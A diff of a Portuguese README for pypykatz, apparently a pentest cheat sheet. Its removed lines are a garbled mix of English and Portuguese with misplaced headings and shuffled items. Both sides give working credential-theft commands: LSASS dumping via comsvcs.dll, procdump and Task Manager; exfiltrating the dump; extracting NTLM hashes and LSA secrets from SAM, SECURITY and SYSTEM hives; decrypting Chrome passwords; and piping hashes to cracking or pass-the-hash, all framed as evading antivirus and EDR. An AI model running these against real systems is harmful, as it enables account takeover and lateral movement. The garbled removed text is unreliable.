@@ -1,39 +1,42 @@
-# 🔍 pypykatz — Guia de referência completo
-
 <!-- language-home-navigation -->
-[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[pypykatz](https://github.com/skelsec/pypykatz) is a pure Python implementation of [Mimikatz](https://github.com/gentilkiwi/mimikatz). It enables penetration testers and incident responders to parse Windows LSASS memory dumps, SAM/SYSTEM/SECURITY registry hives, DPAPI keys, and Kerberos tickets completely offline on Linux and macOS without triggering Windows Defender, endpoint detection and response (EDR) agents, or needing live Windows host access.
-
----
-
-## 📋 Índice
-
-- [Introdução](#overview--operational-security-opsec)
-- [Instalação](#installation)
-- [Instalação](#offline-lsass-dump-parsing-lsa-minidump)
-- [SAM & SYSTEM Hive Extraction (`registry sam`)](#sam--system-hive-extraction-registry-sam)
-- [LSA Secrets Extraction (`registry security`)](#lsa-secrets-extraction-registry-security)
-- [`_SC_DefaultPassword`: Autologon credentials.](#dpapi-master-keys--credential-parsing)
-- [JSON Export & Automated Credential Pipelines](#json-export--automated-credential-pipelines)
-- [Techniques to Safely Dump LSASS on Windows](#techniques-to-safely-dump-lsass-on-windows)
+[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## Introdução
 
-Running standard `mimikatz.exe` on a target Windows machine frequently trips behavioral sensors and static signatures. `pypykatz` separates the dumping phase from the parsing phase:
-1. Dump the LSASS process memory using native or LOLBAS tools (Task Manager, `procdump`, `rundll32.exe`, or `comsvcs.dll`).
-2. Exfiltrate the `.dmp` file to your Linux analysis system.
-3. Parse credentials completely offline with `pypykatz` with zero AV risk.
+# Folha de dicas do pypykatz
+
+[pypykatz](https://github.com/skelsec/pypykatz) é uma implementação Python pura de [Mimikatz](https://github.com/gentilkiwi/mimikatz). Ele permite que testadores de penetração e respondedores de incidentes analisem despejos de memória LSASS do Windows, seções de registro SAM/SYSTEM/SECURITY, chaves DPAPI e tickets Kerberos completamente offline no Linux e macOS sem acionar o Windows Defender, agentes de detecção e resposta de endpoint (EDR) ou a necessidade de acesso ao host do Windows ao vivo.
+
+---
+
+## Índice
+
+- [Visão geral e segurança operacional (OpSec)](#overview--operacional-segurança-opsec)
+- [Instalação](#instalação)
+- [Análise de dump LSASS off-line (`lsa minidump`)](#offline-lsass-dump-parsing-lsa-minidump)
+- [Extração de colmeia SAM e SYSTEM (`registry sam`)](#sam--system-hive-extraction-registry-sam)
+- [Extração de segredos LSA (`registry security`)](#lsa-secrets-extraction-registry-security)
+- [Chaves mestras DPAPI e análise de credenciais](#dpapi-master-keys--credential-parsing)
+- [Exportação JSON e pipelines de credenciais automatizados](#json-export--automated-credential-pipelines)
+- [Técnicas para despejar LSASS com segurança no Windows](#techniques-to-safely-dump-lsass-on-windows)
+
+---
+
+## Visão geral e segurança operacional (OpSec)
+
+A execução do `mimikatz.exe` padrão em uma máquina Windows de destino frequentemente aciona sensores comportamentais e assinaturas estáticas. `pypykatz` separa a fase de dumping da fase de análise:
+1. Descarregue a memória do processo LSASS usando ferramentas nativas ou LOLBAS (Gerenciador de Tarefas, `procdump`, `rundll32.exe` ou `comsvcs.dll`).
+2. Exfiltre o arquivo `.dmp` para seu sistema de análise Linux.
+3. Analise credenciais completamente offline com `pypykatz` sem risco AV.
 
 ---
 
 ## Instalação
-
 ```bash
 # Recommended: Install via pipx
 pipx install pypykatz
@@ -49,100 +52,90 @@ pip install .
 # Verify installation
 pypykatz -h
 ```
-
 ---
 
-## Instalação
+## Análise de despejo LSASS off-line (`lsa minidump`)
 
-Parse memory dumps generated from `lsass.exe` to retrieve cleartext passwords, NTLM hashes, SHA1 hashes, Kerberos tickets (TGT/TGS), and AES encryption keys:
+Analise dumps de memória gerados a partir de `lsass.exe` para recuperar senhas de texto não criptografado, hashes NTLM, hashes SHA1, tickets Kerberos (TGT/TGS) e chaves de criptografia AES:
 
-### 1. Basic Minidump Parsing
+### 1. Análise básica de minidespejo
 ```bash
 pypykatz lsa minidump /path/to/lsass.dmp
 ```
-Offline LSASS Dump Parsing (`lsa minidump`)
-- **msv1_0**: Usernames, domains, NTLM hashes, and LM hashes.
-- **wdigest**: Cleartext passwords (if WDigest caching is enabled).
-- **kerberos**: Kerberos ticket sessions and AES keys.
-- **ssp**: Security Support Provider credentials.
-- **livessp**: Microsoft account credentials.
-- **cloudap**: Azure AD Primary Refresh Tokens (PRT) and session keys.
+A saída extrai credenciais particionadas por provedores de segurança:
+- **msv1_0:** Nomes de usuário, domínios, hashes NTLM e hashes LM.
+- **wdigest:** Senhas em texto simples (se o cache WDigest estiver ativado).
+- **kerberos:** sessões de ticket Kerberos e chaves AES.
+- **ssp:** Credenciais do provedor de suporte de segurança.
+- **livessp:** Credenciais da conta da Microsoft.
+- **cloudap:** Tokens de atualização primária (PRT) do Azure AD e chaves de sessão.
 
-### Dicas e melhores práticas
+### 2. Analise vários despejos de memória recursivamente
 ```bash
 pypykatz lsa minidump /loot/dumps/ -r
 ```
-
 ---
 
-## SAM & SYSTEM Hive Extraction (`registry sam`)
+## Extração de colmeia SAM e SYSTEM (`registry sam`)
 
-Extract local account usernames, RIDs, and NTLM password hashes from offline Windows registry hive copies:
-
+Extraia nomes de usuários de contas locais, RIDs e hashes de senha NTLM de cópias offline do hive do registro do Windows:
 ```bash
 pypykatz registry sam /loot/SYSTEM /loot/SAM
 ```
-Copy an exploit PoC file (Python, C, Ruby, bash) directly to your local working directory:
+Saída:
 ```text
 RID: 500
 Username: Administrator
 LM: None
 NT: 31d6cfe0d16ae931b73c59d7e0c089c0
 ```
-
 ---
 
-## LSA Secrets Extraction (`registry security`)
+## Extração de segredos LSA (`registry security`)
 
-Recover LSA secrets, machine account passwords, default domain passwords, and service account cleartext keys from the `SECURITY` and `SYSTEM` hives:
-
+Recupere segredos LSA, senhas de contas de máquinas, senhas de domínio padrão e chaves de texto não criptografado de contas de serviço dos hives `SECURITY` e `SYSTEM`:
 ```bash
 pypykatz registry security /loot/SYSTEM /loot/SECURITY
 ```
-Extracted secrets include:
-- LSA Secrets Extraction (`registry security`)
-- `$MACHINE.ACC`: Domain computer account NTLM hashes.
-- Recover LSA secrets, machine account passwords, default domain passwords, and service account cleartext keys from the `SECURITY` and `SYSTEM` hives:
+Os segredos extraídos incluem:
+- `_SC_DefaultPassword`: credenciais de logon automático.
+- `$MACHINE.ACC`: hashes NTLM da conta do computador de domínio.
+- Credenciais de domínio em cache (DCC2/mscache2).
 
 ---
 
-## `_SC_DefaultPassword`: Autologon credentials.
+## Chaves mestras DPAPI e análise de credenciais
 
-Cached domain credentials (DCC2 / mscache2).
+A API de proteção de dados (DPAPI) criptografa senhas do Chrome, chaves de Wi-Fi e credenciais RDP:
 
-### 1. Extract DPAPI Master Keys from Registry & SYSTEM
+### 1. Extraia as chaves mestras DPAPI do registro e do sistema
 ```bash
 pypykatz dpapi masterkey /loot/SYSTEM /loot/masterkey_file
 ```
-
-### 2. Decrypt Chrome Stored Passwords
+### 2. Descriptografar senhas armazenadas no Chrome
 ```bash
 pypykatz dpapi chrome --masterkey <MASTER_KEY_HEX> /loot/Login_Data
 ```
-
 ---
 
-## JSON Export & Automated Credential Pipelines
+## Exportação JSON e pipelines de credenciais automatizados
 
-Export parsed credentials directly to JSON for immediate ingestion into Hashcat, BloodHound, or CrackMapExec:
-
+Exporte credenciais analisadas diretamente para JSON para ingestão imediata em Hashcat, BloodHound ou CrackMapExec:
 ```bash
 # Export minidump parsing to structured JSON
 pypykatz lsa minidump lsass.dmp -k /tmp/loot_creds.json
 ```
-
-JSON Export & Automated Credential Pipelines
+Extraia hashes NTLM limpos usando `jq` para quebra imediata de hash ou passagem do hash:
 ```bash
 jq -r '.logon_sessions[].msv_creds[] | "\(.username):\(.NT)"' /tmp/loot_creds.json | grep -v 'None' | sort -u > ntlm_hashes.txt
 ```
-
 ---
 
-## Techniques to Safely Dump LSASS on Windows
+## Técnicas para descartar LSASS com segurança no Windows
 
-To feed memory into `pypykatz`, create an LSASS minidump on the target host using native components:
+Para alimentar `pypykatz` com memória, crie um minidespejo LSASS no host de destino usando componentes nativos:
 
-### 1. Native LOLBAS via `comsvcs.dll` (Admin PowerShell)
+### 1. LOLBAS nativo via `comsvcs.dll` (Admin PowerShell)
 ```powershell
 # Get LSASS process ID
 $pid = (Get-Process lsass).Id
@@ -150,14 +143,13 @@ $pid = (Get-Process lsass).Id
 # Execute dump using native rundll32
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $pid C:\Windows\Temp\lsass.dmp full
 ```
-
-### 2. Task Manager GUI
-To feed memory into `pypykatz`, create an LSASS minidump on the target host using native components:
-2. Under **Details**, right-click `lsass.exe`.
-1. Native LOLBAS via `comsvcs.dll` (Admin PowerShell)
+### 2. GUI do Gerenciador de Tarefas
+1. Abra o Gerenciador de Tarefas como Administrador.
+2. Em **Detalhes**, clique com o botão direito em `lsass.exe`.
+3. Clique em **Criar arquivo de despejo** (salvo em `%TEMP%\lsass.DMP`).
 
 ### 3. Sysinternals `procdump`
 ```cmd
 procdump.exe -ma -accepteula lsass.exe C:\Temp\lsass.dmp
 ```
-*Once downloaded to your Linux machine, execute `pypykatz lsa minidump lsass.dmp`.*
+*Depois de baixado para sua máquina Linux, execute `pypykatz lsa minidump lsass.dmp`.*
